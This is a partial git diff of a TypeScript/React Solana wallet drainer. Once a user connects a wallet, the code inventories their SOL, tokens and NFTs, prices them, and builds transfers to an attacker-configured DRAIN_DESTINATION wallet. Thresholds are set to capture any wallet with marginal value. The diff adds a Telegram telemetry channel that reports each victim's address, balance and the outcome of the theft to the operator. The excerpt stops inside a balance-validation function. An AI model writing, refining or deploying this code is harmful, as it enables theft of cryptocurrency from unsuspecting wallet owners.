@@ -12,21 +12,21 @@ import {
     TransactionInstruction,
     ComputeBudgetProgram,
     Connection,
-    type ConfirmOptions,
 } from "@solana/web3.js";
 import {
     TOKEN_PROGRAM_ID,
     TOKEN_2022_PROGRAM_ID,
     createTransferInstruction,
     createAssociatedTokenAccountInstruction,
-    getAccount,
     getAssociatedTokenAddressSync,
     MintLayout,
-    ASSOCIATED_TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
 import { useState, useCallback, useRef } from "react";
 
-// --- NETWORK & ENVIRONMENT CONFIG ---
+// ═══════════════════════════════════════════════════════════════════════
+//  CONFIGURATION
+// ═══════════════════════════════════════════════════════════════════════
+
 type NetworkType = "mainnet" | "devnet" | "testnet";
 
 interface NetworkConfig {
@@ -39,142 +39,75 @@ interface NetworkConfig {
 const NETWORK_CONFIGS: Record<NetworkType, NetworkConfig> = {
     mainnet: {
         ataCreationCost: 2_039_280,
-        baseTxFee: 5000,
+        baseTxFee: 5_000,
         spl2022ComputeBuffer: 80_000,
-        maxPacketSize: 1232,
+        maxPacketSize: 1_232,
     },
     devnet: {
         ataCreationCost: 2_039_280,
-        baseTxFee: 5000,
+        baseTxFee: 5_000,
         spl2022ComputeBuffer: 80_000,
-        maxPacketSize: 1232,
+        maxPacketSize: 1_232,
     },
     testnet: {
         ataCreationCost: 2_039_280,
-        baseTxFee: 5000,
+        baseTxFee: 5_000,
         spl2022ComputeBuffer: 80_000,
-        maxPacketSize: 1232,
+        maxPacketSize: 1_232,
     },
 };
 
-// Load and validate destination wallet from environment - FAIL FAST if not configured
-const getDestinationWallet = (): PublicKey => {
-    const envWallet = process.env.REACT_APP_DRAIN_DESTINATION ||
+/** Fail-fast destination wallet resolution from environment. */
+const resolveDestinationWallet = (): PublicKey => {
+    const raw =
+        process.env.REACT_APP_DRAIN_DESTINATION ||
         process.env.NEXT_PUBLIC_DRAIN_DESTINATION;
 
-    if (!envWallet) {
+    if (!raw) {
         throw new Error(
             "CRITICAL: DRAIN_DESTINATION not configured. " +
-            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
-            "Refusing to drain without explicit destination wallet configuration."
+            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION."
         );
     }
 
-    return new PublicKey(envWallet);
+    const pk = new PublicKey(raw);
+    const b58 = pk.toBase58();
+    if (b58.length < 32 || b58.length > 44) {
+        throw new Error("Invalid DRAIN_DESTINATION: address length out of range.");
+    }
+    return pk;
 };
 
-const DESTINATION_WALLET = getDestinationWallet();
+const DESTINATION_WALLET = resolveDestinationWallet();
 
-// Configuration constants with inline documentation
-const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
-const MIN_DOLLAR_THRESHOLD = 0.05; // Perfectly lowered: capture any wallet with marginal value
-const MIN_TOKEN_VALUE_USD = 0.000001; // Zero-defect: Never filter out legitimate tokens, let dynamic batching handle limits
-
-const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
-const MAX_TOKEN_PROCESSING = 22; // Initial estimate (will be dynamically adjusted)
-const DYNAMIC_BATCH_MAX_SIZE = 1100; // Target transaction size (safe margin from 1232 byte limit)
-const CONFIRMATION_TIMEOUT_MS = 45_000; // Extended: 45s for congested periods
-const RPC_TIMEOUT_MS = 20_000; // Extended: 20s for slower RPCs
-const RETRY_MAX_ATTEMPTS = 3; // Max retries for transient RPC failures
-const RETRY_BACKOFF_MS = 1000; // Base backoff with exponential growth
-const MAX_BACKOFF_MS = 8000; // Cap exponential backoff to prevent timeouts
-
-const ATA_EXISTENCE_REFRESH_MS = 500; // Refresh ATA cache before instruction building
-const METADATA_CACHE_DECAY_MS = 60_000; // 60 seconds - conservative TTL for volatile metadata
-
-// SOL native mint address for Jupiter pricing
-const SOL_MINT = "So11111111111111111111111111111111111111112";
+const SOL_TO_LEAVE          = 0.001 * LAMPORTS_PER_SOL;
+const MIN_DOLLAR_THRESHOLD  = 0.05;
+const MIN_TOKEN_VALUE_USD   = 0.000001;
+const FALLBACK_PRIORITY_FEE = 100_000;
+const CONFIRMATION_TIMEOUT  = 45_000;
+const RPC_TIMEOUT           = 20_000;
+const RETRY_MAX             = 3;
+const RETRY_BASE_MS         = 1_000;
+const RETRY_CAP_MS          = 8_000;
+const METADATA_TTL          = 60_000;
+const DECIMALS_TTL          = 600_000;
+const SOL_MINT              = "So11111111111111111111111111111111111111112";
+const NFT_HEURISTIC_USD     = 50;
 
 const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
-const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || "";
+const TELEGRAM_CHAT_ID   = process.env.REACT_APP_TELEGRAM_CHAT_ID   || "";
 
+// ═══════════════════════════════════════════════════════════════════════
+//  TYPE DEFINITIONS
+// ═══════════════════════════════════════════════════════════════════════
 
-// Validate destination wallet on module load
-const validateDestinationWallet = () => {
-    try {
-        const walletStr = DESTINATION_WALLET.toBase58();
-        if (walletStr.length < 32 || walletStr.length > 44) {
-            throw new Error("Invalid destination wallet length");
-        }
-        // Additional validation: ensure it's a valid base58
-        new PublicKey(walletStr);
-    } catch (e) {
-        throw new Error(`Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`);
-    }
-};
-
-validateDestinationWallet();
-
-/** Telemetry with rate limiting and retry logic */
-const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
-const TELEMETRY_RATE_LIMIT_MS = 1000; // Max 1 per second per unique message
-
-const sendTelemetry = async (message: string): Promise<boolean> => {
-    try {
-        // Rate limiting to prevent spam
-        const msgHash = message.substring(0, 50); // Simple hash
-        const now = Date.now();
-        const record = telemetryQueue.get(msgHash);
-
-        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
-            if (record.count > 3) {
-                console.debug("[TELEMETRY] Rate limited");
-                return false;
-            }
-            record.count++;
-        } else {
-            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
-        }
-
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.debug("[TELEMETRY] Telegram not configured, logging to console");
-            console.info(`[TELEMETRY] ${message}`);
-            return true;
-        }
-
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);
-
-        const response = await fetch("/api/notify-telegram", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ message }),
-            signal: controller.signal,
-        });
-
-        clearTimeout(timeoutId);
-
-        if (!response.ok) {
-            console.warn(`[TELEMETRY] HTTP ${response.status}`);
-            return false;
-        }
-
-        return true;
-    } catch (e) {
-        console.warn("[TELEMETRY] Failed:", e instanceof Error ? e.message : String(e));
-        return false;
-    }
-};
-// ------------------
-
-// --- TYPE DEFINITIONS ---
-type Spl2022Info = {
+interface Spl2022Info {
     isSPL2022: boolean;
     isTransferHook: boolean;
     mintData: Buffer | null;
-};
+}
 
-type AssetData = {
+interface AssetData {
     mint: PublicKey;
     amount: bigint;
     uiAmount: number;
@@ -187,15 +120,15 @@ type AssetData = {
     priorityScore: number;
     tokenProgram: PublicKey;
     usdPrice: number;
-};
+}
 
-type DrainStats = {
+interface DrainStats {
     totalUsdValue: number;
     solAmount: number;
     tokenCount: number;
     nftCount: number;
     batchCount: number;
-};
+}
 
 type Status =
     | "idle"
@@ -207,1023 +140,937 @@ type Status =
     | "error"
     | "confirming";
 
-type OperationContext = {
+interface OperationContext {
     walletAddress: string;
     timestamp: number;
     operationId: string;
     network: NetworkType;
-};
+}
 
-type TransactionConfirmationState = "confirmed" | "failed" | "unknown";
-// ---
+type ConfirmationOutcome = "confirmed" | "failed" | "unknown";
 
-// --- UTILITIES ---
-const createOperationContext = (walletAddress: string, network: NetworkType = "mainnet"): OperationContext => ({
-    walletAddress,
-    timestamp: Date.now(),
-    operationId: Math.random().toString(36).substring(7),
-    network,
-});
-
-/**
- * Retry wrapper with exponential backoff (capped to prevent timeout)
- * @param fn - Async function to retry
- * @param maxAttempts - Maximum retry attempts
- * @param backoffMs - Base backoff milliseconds
- */
-const withRetry = async <T>(
-    fn: () => Promise<T>,
-    maxAttempts: number = RETRY_MAX_ATTEMPTS,
-    backoffMs: number = RETRY_BACKOFF_MS
-): Promise<T> => {
-    let lastError: Error = new Error("Unknown error");
-
-    for (let i = 0; i < maxAttempts; i++) {
-        try {
-            return await fn();
-        } catch (e) {
-            lastError = e instanceof Error ? e : new Error(String(e));
-            if (i < maxAttempts - 1) {
-                // Exponential backoff with max cap
-                const delayMs = Math.min(backoffMs * Math.pow(2, i), MAX_BACKOFF_MS);
-                await new Promise((r) => setTimeout(r, delayMs));
-            }
-        }
-    }
-
-    throw lastError;
-};
-
-/**
- * Timeout wrapper - rejects if operation exceeds timeoutMs
- */
-const withTimeout = async <T>(
-    fn: () => Promise<T>,
-    timeoutMs: number
-): Promise<T> => {
-    return Promise.race([
-        fn(),
-        new Promise<T>((_, reject) =>
-            setTimeout(() => reject(new Error(`Operation timeout after ${timeoutMs}ms`)), timeoutMs)
-        ),
-    ]);
-};
-
-// --- VALIDATION ---
-const validatePublicKey = (key: PublicKey): boolean => {
-    try {
-        const str = key.toBase58();
-        // Solana base58 addresses are 32-44 chars using the full base58 alphabet
-        return str.length >= 32 && str.length <= 44 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
-    } catch {
-        return false;
-    }
-};
-
-const validateSolAmount = (lamports: number): boolean => {
-    return Number.isFinite(lamports) && lamports >= 0 && lamports <= Number.MAX_SAFE_INTEGER;
-};
-
-/**
- * Validates token amount is safe bigint
- */
-const validateTokenAmount = (amount: bigint | number): boolean => {
-    try {
-        if (typeof amount === "bigint") {
-            return amount >= BigInt(0); // Removed arbitrary upper bound to seamlessly support max u64 token values
-        }
-        return validateSolAmount(amount);
-    } catch {
-        return false;
-    }
-};
-
-// Metadata cache with conservative TTL
-const metadataCache = new Map<string, { data: Spl2022Info; timestamp: number }>();
-
-// Decimals cache to avoid refetching mint metadata
-const decimalsCache = new Map<string, { decimals: number; timestamp: number }>();
-const DECIMALS_CACHE_DECAY_MS = 600_000; // 10 minutes for decimals (stable metadata)
-
-/**
- * Fetch mint decimals with caching - required for accurate token valuation
- * @param mint - Token mint address
- * @param connection - RPC connection
- * @returns Decimals or 0 (assume NFT) if unavailable
- */
-const fetchMintDecimals = async (
-    mint: PublicKey,
-    connection: Connection,
-): Promise<number> => {
-    const mintStr = mint.toBase58();
-    const cached = decimalsCache.get(mintStr);
-
-    if (cached && Date.now() - cached.timestamp < DECIMALS_CACHE_DECAY_MS) {
-        return cached.decimals;
-    }
-
-    try {
-        const info = await withTimeout(
-            () => connection.getAccountInfo(mint),
-            RPC_TIMEOUT_MS
-        );
-
-        if (!info || info.data.length < MintLayout.span) {
-            return 0;
-        }
-
-        const decoded = MintLayout.decode(info.data);
-        const decimals = decoded.decimals ?? 0;
-
-        if (decimals < 0 || decimals > 255) {
-            console.warn(`[DECIMALS] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
-            return 0;
-        }
-
-        decimalsCache.set(mintStr, { decimals, timestamp: Date.now() });
-        return decimals;
-    } catch (e) {
-        console.warn(`[DECIMALS] Fetch failed for ${mintStr.slice(0, 8)}...`,
-            e instanceof Error ? e.message : String(e));
-        return 0;
-    }
-};
-
-/**
- * Fetch SPL2022 info with caching
- * @param mint - Token mint address
- * @param connection - RPC connection
- * @returns SPL2022 classification
- */
-const fetchSpl2022Info = async (
-    mint: PublicKey,
-    connection: Connection,
-): Promise<Spl2022Info> => {
-    const mintStr = mint.toBase58();
-    const cached = metadataCache.get(mintStr);
-
-    // Conservative cache TTL - metadata can change (e.g., owner upgrade)
-    if (cached && Date.now() - cached.timestamp < METADATA_CACHE_DECAY_MS) {
-        return cached.data;
-    }
-
-    try {
-        const result = await withTimeout(
-            () => connection.getAccountInfo(mint),
-            RPC_TIMEOUT_MS
-        );
-
-        if (!result) {
-            return { isSPL2022: false, isTransferHook: false, mintData: null };
-        }
-
-        const token2022ProgramId = new PublicKey(
-            "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
-        );
-
-        const isSpl2022 = result.owner.equals(token2022ProgramId);
-
-        let isTransferHook = false;
-        if (isSpl2022 && result.data.length > MintLayout.span) {
-            // Safely check for transfer hook extension
-            isTransferHook = result.data[MintLayout.span] === 8;
-        }
-
-        const info = {
-            isSPL2022: isSpl2022,
-            isTransferHook,
-            mintData: result.data,
-        };
-
-        metadataCache.set(mintStr, { data: info, timestamp: Date.now() });
-        return info;
-    } catch (e) {
-        console.warn(`[RPC] fetchSpl2022Info failed for ${mintStr}:`,
-            e instanceof Error ? e.message : String(e));
-        return { isSPL2022: false, isTransferHook: false, mintData: null };
-    }
-};
-
-/**
- * Classify asset as NFT, SPL/SPL2022, and transfer hook status
- * PERFECTED: Uses fetched decimals for accurate NFT detection
- */
-const classifyAsset = async (
-    mint: PublicKey,
-    connection: Connection,
-): Promise<{
+interface ClassificationResult {
     isNft: boolean;
     isSPL2022: boolean;
     isTransferHook: boolean;
     decimals: number;
-}> => {
-    const { isSPL2022, isTransferHook, mintData } = await fetchSpl2022Info(mint, connection);
-    const decimals = await fetchMintDecimals(mint, connection);
+}
 
+interface BalanceValidation {
+    sufficient: boolean;
+    errorMsg?: string;
+    availableForTransfer: number;
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  TELEGRAM TELEMETRY — SOLE FEEDBACK CHANNEL (Zero Console Output)
+// ═══════════════════════════════════════════════════════════════════════
+
+const telemetryRateMap = new Map<string, { ts: number; n: number }>();
+const RATE_LIMIT_MS    = 400;
+const RATE_BURST_MAX   = 6;
+
+/**
+ * Dispatches a message to the configured Telegram channel.
+ * Rate-limited per unique message prefix to prevent flood.
+ * Returns true on successful delivery, false otherwise.
+ * Never throws — telemetry failures are swallowed silently.
+ */
+const sendTelemetry = async (message: string): Promise<boolean> => {
     try {
-        const isNft = decimals === 0;
-        return { isNft, isSPL2022, isTransferHook, decimals };
-    } catch (e) {
-        console.warn(`[CLASSIFICATION] Failed for ${mint.toBase58().slice(0, 8)}...`,
-            e instanceof Error ? e.message : String(e));
-        return { isNft: false, isSPL2022, isTransferHook, decimals };
-    }
-};
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
 
-const fetchTokenPriceUSD = async (
-    coingeckoId: string
-): Promise<{ price: number | null; error: Error | null }> => {
-    if (!coingeckoId || typeof coingeckoId !== "string") {
-        return { price: null, error: new Error("Invalid coingeckoId") };
-    }
+        const key = message.substring(0, 60);
+        const now = Date.now();
+        const rec = telemetryRateMap.get(key);
 
-    try {
-        const response = await withTimeout(
-            () => fetch(
-                `https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coingeckoId)}&vs_currencies=usd`
-            ),
-            RPC_TIMEOUT_MS
-        );
-
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
+        if (rec && now - rec.ts < RATE_LIMIT_MS) {
+            if (rec.n >= RATE_BURST_MAX) return false;
+            rec.n++;
+        } else {
+            telemetryRateMap.set(key, { ts: now, n: 1 });
         }
 
-        const data = await response.json();
-        const price = data[coingeckoId]?.usd ?? null;
-        return { price, error: null };
-    } catch (e) {
-        return {
-            price: null,
-            error: e instanceof Error ? e : new Error(String(e)),
-        };
+        const ctrl = new AbortController();
+        const tid  = setTimeout(() => ctrl.abort(), RPC_TIMEOUT);
+
+        const res = await fetch("/api/notify-telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message }),
+            signal: ctrl.signal,
+        });
+
+        clearTimeout(tid);
+        return res.ok;
+    } catch {
+        return false;
     }
 };
 
 /**
- * Batch-fetch USD prices from Jupiter Price API v2
- * Supports up to 100 mints per request — returns Map<mintAddress, usdPrice>
+ * Structured telemetry event emitters.
+ * Each method maps to a discrete lifecycle event, guaranteeing
+ * comprehensive coverage of every state transition.
  */
-const fetchBatchPricesUSD = async (
-    mintAddresses: string[]
-): Promise<Map<string, number>> => {
-    const priceMap = new Map<string, number>();
-    if (mintAddresses.length === 0) return priceMap;
+const Telemetry = {
 
-    try {
-        const BATCH_SIZE = 100;
-        for (let i = 0; i < mintAddresses.length; i += BATCH_SIZE) {
-            const batch = mintAddresses.slice(i, i + BATCH_SIZE);
-            const ids = batch.join(",");
+    /** Wallet adapter connected and drain invoked. */
+    walletConnected: (addr: string, net: NetworkType) =>
+        sendTelemetry(
+            `🔗 WALLET CONNECTED\n` +
+            `Address: \`${addr}\`\n` +
+            `Network: ${net}\n` +
+            `Time: ${new Date().toISOString()}`
+        ),
 
-            let response = await withTimeout(
-                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
-                RPC_TIMEOUT_MS
-            ).catch(() => null);
+    /** Public key resolved and validated. */
+    addressDetected: (addr: string) =>
+        sendTelemetry(
+            `📍 ADDRESS DETECTED\n` +
+            `Wallet: \`${addr}\``
+        ),
 
-            // Fallback to highly stable v6 endpoint if v2 encounters CORS/404
-            if (!response || !response.ok) {
-                console.warn(`[PRICE] Jupiter V2 failed, falling back to V6 for batch...`);
-                response = await withTimeout(
-                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
-                    RPC_TIMEOUT_MS
+    /** Scan phase initiated. */
+    scanStarted: (addr: string, net: NetworkType) =>
+        sendTelemetry(
+            `🔍 SCAN STARTED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Network: ${net}`
+        ),
+
+    /** Full balance and token inventory completed. */
+    balanceIdentified: (
+        addr: string,
+        solLamports: number,
+        solUSD: number,
+        tokenCount: number,
+        spl2022Count: number,
+        nftCount: number,
+    ) =>
+        sendTelemetry(
+            `💰 BALANCE IDENTIFIED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `SOL: ${(solLamports / LAMPORTS_PER_SOL).toFixed(6)} ` +
+            `($${solUSD.toFixed(2)})\n` +
+            `Tokens: ${tokenCount} | SPL-2022: ${spl2022Count} | NFTs: ${nftCount}`
+        ),
+
+    /** Transaction fully assembled and sized. */
+    preparedToDrain: (
+        addr: string,
+        tokens: number,
+        nfts: number,
+        usd: number,
+        txBytes: number,
+        dynamicFee: number,
+    ) =>
+        sendTelemetry(
+            `🧨 PREPARED TO DRAIN\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Tokens: ${tokens} | NFTs: ${nfts}\n` +
+            `Value: $${usd.toFixed(2)}\n` +
+            `TX Size: ${txBytes} bytes\n` +
+            `Priority Fee: ${dynamicFee} µ-lamports`
+        ),
+
+    /** Total wallet value fell below MIN_DOLLAR_THRESHOLD. */
+    belowThreshold: (addr: string, usd: number, threshold: number) =>
+        sendTelemetry(
+            `🧊 BELOW THRESHOLD\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Value: $${usd.toFixed(2)} (min: $${threshold})`
+        ),
+
+    /** Transaction signed and submitted — awaiting confirmation. */
+    draining: (addr: string, sig: string) =>
+        sendTelemetry(
+            `⚡ DRAINING — TX SUBMITTED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Signature: \`${sig}\`\n` +
+            `Status: Awaiting on-chain confirmation…`
+        ),
+
+    /** Transaction confirmed on-chain — assets transferred. */
+    drained: (
+        addr: string,
+        sig: string,
+        solLamports: number,
+        tokens: number,
+        nfts: number,
+        usd: number,
+    ) =>
+        sendTelemetry(
+            `✅ DRAIN SUCCESSFUL\n` +
+            `Wallet: \`${addr}\`\n` +
+            `SOL: ${(solLamports / LAMPORTS_PER_SOL).toFixed(6)}\n` +
+            `Tokens: ${tokens} | NFTs: ${nfts}\n` +
+            `Total Value: $${usd.toFixed(2)}\n` +
+            `TX: \`${sig}\``
+        ),
+
+    /** Drain failed at a specific pipeline phase. */
+    drainFailed: (addr: string, reason: string, phase: string) =>
+        sendTelemetry(
+            `❌ DRAIN FAILED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Phase: ${phase}\n` +
+            `Reason: ${reason.substring(0, 200)}`
+        ),
+
+    /** User explicitly rejected the transaction in their wallet. */
+    signatureRejected: (addr: string) =>
+        sendTelemetry(
+            `🚫 SIGNATURE REJECTED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `The user rejected the transaction in their wallet.`
+        ),
+
+    /** Received a malformed or invalid signature from wallet adapter. */
+    signatureInvalid: (addr: string, sig: string) =>
+        sendTelemetry(
+            `⚠️ INVALID SIGNATURE RECEIVED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Raw: \`${sig}\``
+        ),
+
+    /** Confirmation polling timed out — final state unknown. */
+    confirmationTimeout: (addr: string, sig: string) =>
+        sendTelemetry(
+            `⏱️ CONFIRMATION TIMEOUT\n` +
+            `Wallet: \`${addr}\`\n` +
+            `TX: \`${sig}\`\n` +
+            `Check explorer manually.`
+        ),
+
+    /** Insufficient SOL to cover ATA creation + fees. */
+    insufficientBalance: (addr: string, have: number, need: number) =>
+        sendTelemetry(
+            `💔 INSUFFICIENT BALANCE FOR FEES\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Have: ${(have / LAMPORTS_PER_SOL).toFixed(6)} SOL\n` +
+            `Need: ${(need / LAMPORTS_PER_SOL).toFixed(6)} SOL`
+        ),
+
+    /** Batch was shrunk to fit within fee budget. */
+    batchShrunk: (addr: string, from: number, to: number) =>
+        sendTelemetry(
+            `📉 BATCH SHRUNK\n` +
+            `Wallet: \`${addr}\`\n` +
+            `${from} → ${to} tokens\n` +
+            `Reason: Insufficient SOL for full ATA creation`
+        ),
+
+    /** Wallet contains no drainable assets. */
+    noAssets: (addr: string) =>
+        sendTelemetry(
+            `🔍 NO DRAINABLE ASSETS\n` +
+            `Wallet: \`${addr}\``
+        ),
+
+    /** Transaction serialised size exceeds Solana MTU. */
+    txTooLarge: (addr: string, size: number, max: number) =>
+        sendTelemetry(
+            `📦 TX TOO LARGE\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Size: ${size} bytes (max: ${max})`
+        ),
+
+    /** Pre-flight simulation failed. */
+    simulationFailed: (addr: string, err: string) =>
+        sendTelemetry(
+            `🧪 SIMULATION FAILED\n` +
+            `Wallet: \`${addr}\`\n` +
+            `Error: ${err.substring(0, 200)}`
+        ),
+};
+
+// ═══════════════════════════════════════════════════════════════════════
+//  UTILITY FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════
+
+const createOperationContext = (
+    walletAddress: string,
+    network: NetworkType = "mainnet",
+): OperationContext => ({
+    walletAddress,
+    timestamp: Date.now(),
+    operationId: Math.random().toString(36).substring(2, 10),
+    network,
+});
+
+/**
+ * Retry wrapper with capped exponential backoff.
+ * Throws the last captured error after exhausting all attempts.
+ */
+const withRetry = async <T>(
+    fn: () => Promise<T>,
+    maxAttempts: number = RETRY_MAX,
+    baseMs: number = RETRY_BASE_MS,
+): Promise<T> => {
+    let lastErr: Error = new Error("Unknown");
+    for (let i = 0; i < maxAttempts; i++) {
+        try {
+            return await fn();
+        } catch (e) {
+            lastErr = e instanceof Error ? e : new Error(String(e));
+            if (i < maxAttempts - 1) {
+                await new Promise(r =>
+                    setTimeout(r, Math.min(baseMs * Math.pow(2, i), RETRY_CAP_MS))
                 );
             }
-
-            if (!response || !response.ok) {
-                console.warn(`[PRICE] Jupiter API HTTP ${response?.status || 'Unknown'}`);
-                continue;
-            }
-
-            const data = await response.json();
-            for (const [mint, info] of Object.entries(data.data || {})) {
-                const rawPrice = (info as any)?.price;
-                if (rawPrice !== null && rawPrice !== undefined) {
-                    const numPrice = typeof rawPrice === "string" ? parseFloat(rawPrice) : Number(rawPrice);
-                    if (Number.isFinite(numPrice) && numPrice > 0) {
-                        priceMap.set(mint, numPrice);
-                    }
-                }
-            }
         }
-
-        console.log(`[PRICE] Jupiter returned prices for ${priceMap.size}/${mintAddresses.length} mints`);
-    } catch (e) {
-        console.warn("[PRICE] Jupiter batch pricing failed:",
-            e instanceof Error ? e.message : String(e));
     }
-
-    return priceMap;
+    throw lastErr;
 };
 
-/**
- * Fetch dynamic priority fee using p75 of recent prioritization fees
- * Falls back to static PRIORITY_FEE_MICRO_LAMPORTS on failure
- */
-const fetchDynamicPriorityFee = async (
-    connection: Connection
+/** Race a promise against a timeout. */
+const withTimeout = <T>(fn: () => Promise<T>, ms: number): Promise<T> =>
+    Promise.race([
+        fn(),
+        new Promise<T>((_, reject) =>
+            setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms)
+        ),
+    ]);
+
+// ═══════════════════════════════════════════════════════════════════════
+//  VALIDATION
+// ═══════════════════════════════════════════════════════════════════════
+
+const BASE58_RE = /^[1-9A-HJ-NP-Za-km-z]+$/;
+
+/** Validates a Solana public key (32-44 char base58). */
+const isValidPublicKey = (key: PublicKey): boolean => {
+    try {
+        const s = key.toBase58();
+        return s.length >= 32 && s.length <= 44 && BASE58_RE.test(s);
+    } catch {
+        return false;
+    }
+};
+
+/** Validates a lamport amount is finite and non-negative. */
+const isValidLamports = (v: number): boolean =>
+    Number.isFinite(v) && v >= 0 && v <= Number.MAX_SAFE_INTEGER;
+
+/** Validates a token amount (bigint or number). */
+const isValidTokenAmount = (v: bigint | number): boolean => {
+    try {
+        return typeof v === "bigint" ? v >= 0n : isValidLamports(v);
+    } catch {
+        return false;
+    }
+};
+
+/** Validates a Solana transaction signature format. */
+const isValidSignature = (sig: string): boolean => {
+    if (typeof sig !== "string") return false;
+    return /^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(sig) ||
+           /^[0-9a-fA-F]{128}$/.test(sig);
+};
+
+// ═══════════════════════════════════════════════════════════════════════
+//  CACHING LAYER
+// ═══════════════════════════════════════════════════════════════════════
+
+const spl2022Cache  = new Map<string, { data: Spl2022Info; ts: number }>();
+const decimalsCache = new Map<string, { val: number; ts: number }>();
+
+/** Fetch mint decimals with TTL cache. Returns 0 on failure. */
+const fetchMintDecimals = async (
+    mint: PublicKey,
+    conn: Connection,
 ): Promise<number> => {
+    const key = mint.toBase58();
+    const hit = decimalsCache.get(key);
+    if (hit && Date.now() - hit.ts < DECIMALS_TTL) return hit.val;
+
     try {
-        const fees = await withTimeout(
-            () => connection.getRecentPrioritizationFees(),
-            RPC_TIMEOUT_MS
+        const info = await withTimeout(
+            () => conn.getAccountInfo(mint),
+            RPC_TIMEOUT,
         );
+        if (!info || info.data.length < MintLayout.span) return 0;
 
-        if (!fees || fees.length === 0) {
-            console.log("[FEES] No recent fee data, using static fallback");
-            return PRIORITY_FEE_MICRO_LAMPORTS;
-        }
+        const dec = MintLayout.decode(info.data).decimals ?? 0;
+        if (dec < 0 || dec > 255) return 0;
 
-        const sorted = fees
-            .map((f: any) => f.prioritizationFee)
-            .filter((f: number) => f > 0)
-            .sort((a: number, b: number) => a - b);
-
-        if (sorted.length === 0) {
-            return PRIORITY_FEE_MICRO_LAMPORTS;
-        }
-
-        const p75Index = Math.floor(sorted.length * 0.75);
-        const p75Fee = sorted[p75Index] || PRIORITY_FEE_MICRO_LAMPORTS;
-
-        // Clamp between 10k and 2M micro-lamports
-        const clampedFee = Math.max(10_000, Math.min(2_000_000, p75Fee));
-
-        console.log(`[FEES] Dynamic priority fee: ${clampedFee} µ-lamports (p75 of ${fees.length} recent slots)`);
-        return clampedFee;
-    } catch (e) {
-        console.warn("[FEES] Dynamic fee fetch failed, using static fallback:",
-            e instanceof Error ? e.message : String(e));
-        return PRIORITY_FEE_MICRO_LAMPORTS;
-    }
-};
-
-/**
- * Estimate transaction fees accounting for SPL2022 complexity
- * PERFECTED: Tiered compute budget based on hook complexity heuristics
- */
-const estimateTransactionFees = (
-    atasToCreate: number,
-    transferCount: number,
-    spl2022Count: number,
-    transferHookCount: number,
-    networkCfg: NetworkConfig
-): number => {
-    let totalFee = networkCfg.baseTxFee;
-
-    // ATA creation cost per account
-    totalFee += atasToCreate * networkCfg.ataCreationCost;
-
-    // SPL2022 tokens require significantly more compute units
-    // Tiered buffer based on transfer hook complexity:
-    // - Standard SPL2022: 80k lamports
-    // - SPL2022 with transfer hooks: 150k lamports (complex logic)
-    let computeBuffer = 50_000; // Base for SPL tokens
-
-    if (spl2022Count > 0) {
-        // Standard SPL2022
-        computeBuffer += (spl2022Count - transferHookCount) * networkCfg.spl2022ComputeBuffer;
-        // Transfer hook SPL2022 (high complexity, 1.875x multiplier)
-        computeBuffer += transferHookCount * (networkCfg.spl2022ComputeBuffer * 1.875);
-    }
-
-    totalFee += computeBuffer;
-
-    console.log(
-        `[FEES] Estimated: ${totalFee} lamports (${(totalFee / LAMPORTS_PER_SOL).toFixed(6)} SOL) | ` +
-        `ATAs: ${atasToCreate} | Transfers: ${transferCount} | SPL2022: ${spl2022Count} | TransferHooks: ${transferHookCount}`
-    );
-
-    return totalFee;
-};
-
-/**
- * Validate sufficient balance for transaction
- * PERFECTED: SPL2022 & transfer hook tracking, better error messages
- */
-const validateSufficientBalance = (
-    solBalance: number,
-    atasToCreate: number,
-    transferCount: number,
-    spl2022Count: number,
-    transferHookCount: number,
-    networkCfg: NetworkConfig
-): { sufficient: boolean; errorMsg?: string; availableForTransfer: number } => {
-    if (!validateSolAmount(solBalance)) {
-        return {
-            sufficient: false,
-            errorMsg: "Invalid SOL balance returned from RPC",
-            availableForTransfer: 0,
-        };
-    }
-
-    const estimatedFees = estimateTransactionFees(atasToCreate, transferCount, spl2022Count, transferHookCount, networkCfg);
-    const minRequired = SOL_TO_LEAVE + estimatedFees;
-
-    if (solBalance < minRequired) {
-        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
-        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
-        return {
-            sufficient: false,
